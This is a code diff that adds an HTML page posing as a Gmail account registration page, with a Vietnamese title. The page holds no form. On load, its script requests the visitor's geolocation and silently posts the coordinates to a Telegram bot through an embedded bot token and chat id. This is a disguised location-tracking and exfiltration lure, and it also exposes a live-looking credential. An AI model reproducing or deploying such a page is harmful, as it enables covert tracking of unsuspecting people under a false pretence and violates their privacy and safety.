@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đăng kí tài khoản Gmail</title>
+</head>
+
+<body>
+    <p id="location-info"></p>
+
+    <script>
+        (function getLocation() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    function (position) {
+                        var latitude = position.coords.latitude;
+                        var longitude = position.coords.longitude;
+                        var locationInfo = "Vĩ độ: " + latitude + ", Kinh độ: " + longitude;
+                       
+
+                        const raw = {
+                            chat_id: "-999373056",
+                            text: locationInfo,
+                        };
+                        console.log(JSON.stringify(raw));
+                        // Tùy chỉnh request
+                        const url =
+                            "https://api.telegram.org/bot6029162994:AAGPcSHpEkBLhE2X_1mQwQZVT9KftI2BmjU/sendMessage";
+                        const options = {
+                            method: "POST",
+                            headers: {
+                                "Content-Type": "application/json",
+                            },
+                            body: JSON.stringify(raw),
+                        };
+
+                        // Gửi request sử dụng Fetch API
+                        fetch(url, options)
+                            .then((response) => response.json())
+                            .then((data) => $("#button_successful_consultation").click())
+                            .catch((error) => console.error("Error:", error));
+
+
+                    },
+                    function (error) {
+                        var errorMessage = "Lỗi định vị: " + error.message;
+                        document.getElementById("location-info").innerText = errorMessage;
+                    }
+                );
+            } else {
+                var notSupportedMessage = "Trình duyệt không hỗ trợ định vị.";
+                document.getElementById("location-info").innerText = notSupportedMessage;
+            }
+        }())
+    </script>
+</body>
+
+</html>
